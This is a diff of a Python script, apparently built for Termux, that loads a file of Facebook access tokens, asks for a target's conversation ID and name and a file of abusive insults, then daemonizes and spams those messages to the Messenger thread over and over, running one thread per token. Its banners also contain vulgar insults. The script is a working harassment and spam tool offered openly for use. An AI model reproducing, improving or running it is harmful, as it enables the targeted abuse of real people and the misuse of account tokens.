+        sys.stdout.write("\x1b[1;%sm%s%s\n" % (random.choice(color_list), line, clear))
+        time.sleep(0.05)
 
 # --- Main Execution Block ---
-if True:    
-    i = datetime.datetime.now()
-    print(i.strftime("\033[1;32m[•] Start Time ==> %Y-%m-%d %I:%M:%S %p "))
-    print('\033[1;32m[•] _ Tool Creator == > [ RAJ THAKUR KA LODA ON FIRE ♻️ ]\n')
-    print("\033[1;36;40m", end = "")
-    print(f"""\x1b[1;97m 
-\033[1;36m$$$$$$$\   $$$$$$\     $$$$$\ 
-\033[1;36m$$  __$$\ $$  __$$\    \__$$ |
-\033[1;34m$$ |  $$ |$$ /  $$ |      $$ |
-\033[1;34m$$$$$$$  |$$$$$$$$ |      $$ |
-\033[1;36m$$  __$$< $$  __$$ |$$\   $$ |
-\033[1;32m$$ |  $$ |$$ |  $$ |$$ |  $$ |
-\033[1;33m$$ |  $$ |$$ |  $$ |\$$$$$$  |
-\033[1;33m\__|  \__|\__|  \__| \______/ 
+cls()
+testPY()
+if os.path.exists("stop_signal.txt"):
+    os.remove("stop_signal.txt")
 
+# Show animated logo and other animations
+animated_logo()
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
+    $$$$$$$\   $$$$$$\     $$$$$\
+    $$  __$$\ $$  __$$\    \__$$ |
+    $$ |  $$ |$$ /  $$ |      $$ |
+    $$$$$$$  |$$$$$$$$ |      $$ |
+    $$  __$$< $$  __$$ |$$\   $$ |
+    $$ |  $$ |$$ |  $$ |$$ |  $$ |
+    $$ |  $$ |$$ |  $$ |\$$$$$$  |
+    \__|  \__|\__|  \__| \______/
 
-         \033[1;33m  /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$   /$$  /$$$$$$  /$$   /$$
-          \033[1;33m| $$__  $$ /$$__  $$|__  $$__/| $$  | $$ /$$__  $$| $$  /$$/
-          \033[1;36m| $$  \ $$| $$  \ $$   | $$   | $$  | $$| $$  \ $$| $$ /$$/ 
-          \033[1;36m| $$$$$$$/| $$$$$$$$   | $$   | $$$$$$$$| $$$$$$$$| $$$$$/  
-          \033[1;33m| $$____/ | $$__  $$   | $$   | $$__  $$| $$__  $$| $$  $$  
-          |\033[1;35m $$      | $$  | $$   | $$   | $$  | $$| $$  | $$| $$\  $$ 
-          \033[1;36m| $$      | $$  | $$   | $$   | $$  | $$| $$  | $$| $$ \  $$
-          \033[1;53m|__/      |__/  |__/   |__/   |__/  |__/|__/  |__/|__/  \__/
-                                                            
-                                                            
-                                                            
-                                           
-\x1b[1;34m════════════════════════════════════════════════════════
-\033[1;31m▇==➤ ADMIN        : RAJ-THAKUR
-\033[1;37m▇==➤ GITHUB       : RAJ-THAKUR
-\033[1;31m▇==➤ OWNER        : RAJ-THAKUR
-\033[1;37m▇==➤ FACEBOOK     : L3G3NDCHOD R9J
-\033[1;32m▇==➤ BROTHER      : RAJ THAKUR X3 DEV PANDIT
-\x1b[1;34m════════════════════════════════════════════════════════""")
-    os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
-    token_file = input("[+] Input Token File Name :: ")
-    print('\n')
-    with open(token_file, 'r') as f2:
-        token_data = f2.read()
-    tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
-    if len(tokens) == 0:
-        print("No tokens found. Exiting.")
-        sys.exit()
-    access_token = tokens[0]  # For profile verification
-    
-    # Prompt for fallback phone number for SMS (include country code, e.g., +91XXXXXXXXXX)
-    fallback_phone = input("[+] Enter fallback phone number for SMS (with country code): ").strip()
-    
-    payload = {'access_token': access_token}
-    a = "https://graph.facebook.com/v15.0/me"
-    b = requests.get(a, params=payload)
-    d = json.loads(b.text)
-    if 'name' not in d:
-        print(BOLD + RED + '\n[x] Token Invalid..!!')
-        sys.exit()
-    mb = d['name']
-    print('\033[1;32mYour Profile Name :: \033[1;32;1m%s' % (mb))
-    print('\n')
-    
-    # Start background offline queue processor
-    start_queue_processor()
-    
-    os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
-    thread_id = input(BOLD + CYAN + "[+] Conversation ID :: ")
-    os.system('espeak -a 300 "TATE KA NAME DALO"')
-    mn = input(BOLD + CYAN + "[+] Enter Kidx Name :: ")
-    os.system('espeak -a 300 "GALI FILE DALO"')
-    ms = input(BOLD + CYAN + "[+] Add Gali File Name :: ")
-    os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')
-    repeat = int(input(BOLD + CYAN + "[+] File Repeat No :: "))
-    os.system('espeak -a 300 "SPEED DALO YAR"')
-    timm = int(input(BOLD + CYAN + "[+] Speed in Seconds :: "))
-    print('\n')
-    print('\033[1;34m________All Done....Loading Profile Info.....!')
-    print('\033[1;34mYour Profile Name :: ', mb)
-    print('\n')
-    ns = open(ms, 'r').readlines()
-    
-    # ----- Daemonize now so that the script runs in background even after Termux exit -----
-    daemonize()
-    
-    # Main loop: send messages repeatedly as per the input repeat count
-    for i in range(repeat):
-        get_messages()  # For compatibility; can be expanded if needed.
-        message_on_messenger(thread_id)
+                $$$$$$\  $$$$$$\ $$\   $$\  $$$$$$\  $$\   $$\
+              $$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\ $$ |  $$ |
+              $$ /  \__|  $$ |  $$$$\ $$ |$$ /  \__|$$ |  $$ |
+              \$$$$$$\    $$ |  $$ $$\$$ |$$ |$$$$\ $$$$$$$$ |
+               \____$$\   $$ |  $$ \$$$$ |$$ |\_$$ |$$  __$$ |
+              $$\   $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |  $$ |
+              \$$$$$$  |$$$$$$\ $$ | \$$ |\$$$$$$  |$$ |  $$ |
+               \______/ \______|\__|  \__| \______/ \__|  \__|""".splitlines()]
+colored_logo()
+venom()
+print(Fore.GREEN + "[•] Start Time ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
+print(Fore.GREEN + "[•] _ Tool Creator == > [ RAJ THAKUR KA LODA ON FIRE ♻️ ] CHANDU KA B44P ==>[ RAJ THAKUR ⌛⚔️🔥]\n")
+animated_print("<==========================>", delay=0.005, jitter=0.002)
+animated_print("[•] Your Stop Key: " + get_stop_key(), delay=0.005, jitter=0.002)
+animated_print("<============================>", delay=0.005, jitter=0.002)
+print_custom_bio()
+sys.stdout.flush()
+
+daemonize_mode = True
+sms_display = False
+menu_choice = main_menu()
+if menu_choice == "1":
+    daemonize_mode = True
+    sms_display = False
 else:
-    print(BOLD + RED + '[-] <==> Your Number Is Wrong Please Take Approval From Owner')
+    sys.exit()
+
+os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+
+token_file = input("[+] Input Token File Name: ").strip()
+
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+with open(token_file, 'r') as f2:
+    token_data = f2.read()
+tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
+if not tokens:
+    sys.exit()
+
+# Original single token profile fetch (जैसा पहले था)
+access_token = tokens[0]
+payload = {'access_token': access_token}
+a = "https://graph.facebook.com/v15.0/me"
+b = requests.get(a, params=payload)
+d = json.loads(b.text)
+if 'name' not in d:
+    sys.exit()
+mb = d['name']   # Global profile name update
+print(Fore.GREEN + "Your Profile Name :: " + mb + "\n")
+
+# NEW: Unlimited Token Profile Fetching & Display
+token_profiles = []
+for token in tokens:
+    profile_name = fetch_profile_name(token)
+    color = random.choice(color_list)
+    token_profiles.append((token, profile_name, color))
+display_token_profiles(token_profiles)
+
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+start_queue_processor()
+
+os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
+
+thread_id = input("[1] ENTER YOUR CONVO UID (FACEBOOK KI LINK 🔗 UID ) =====> ").strip()
+
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+os.system('espeak -a 300 "TATE KA NAME DALO"')
+
+mn = input("[1] ENTER YOUR  HATERS NAME 😡 (TUMHARE DUSHMAN KA NAAM DALO ) =====> ").strip()
+
+os.system('espeak -a 300 "GALI FILE DALO"')
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+
+ms = input("[1] ENTER YOUR GALI FILE PAITH (FILE 🗃️ TXT) 🔥=====>: ").strip()
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')
+
+repeat = int(input("[+] [1] ENTER YOUR FILE REPEAT 🔁  (KITNI FILE COUNT KARNA HAI)🔥=====> "))
+
+os.system('espeak -a 300 "SPEED DALO YAR"')
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+
+timm = int(input("[1] ENTER SPEED IN SECONDS  (KITNI SECOND MEIN MESSAGE BHEJNA HAI YA MINUTE)=====> "))
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+
+print(Fore.BLUE + "\n___WATTING SIR =====> 🚀YOUR MESSAGES HAS STARTED GOING, NOW GO AND CHECK ________________________________________✅ IN YOUR INBOX 📥 OR WHEREVER IT IS BEING POSTED IN THE GROUPS__==========>....!")
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+
+print(Fore.BLUE + "Your Profile Name ===> " + mb + "\n")
+animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
+try:
+    ns = open(ms, 'r').readlines()
+except:
+    sys.exit()
+
+if daemonize_mode:
+    daemonize()
+
+# NEW: अगर multiple tokens हैं, तो हर token के लिए अलग thread से SMS भेजें
+if len(token_profiles) > 1:
+    threads = []
+    for token, profile, color in token_profiles:
+         t = threading.Thread(target=send_messages_for_token, args=(token, profile, thread_id), daemon=True)
+         threads.append(t)
+         t.start()
+    for t in threads:
+         t.join()
+else:
+    for i in range(repeat):
+        check_stop()
+        message_on_messenger(thread_id)
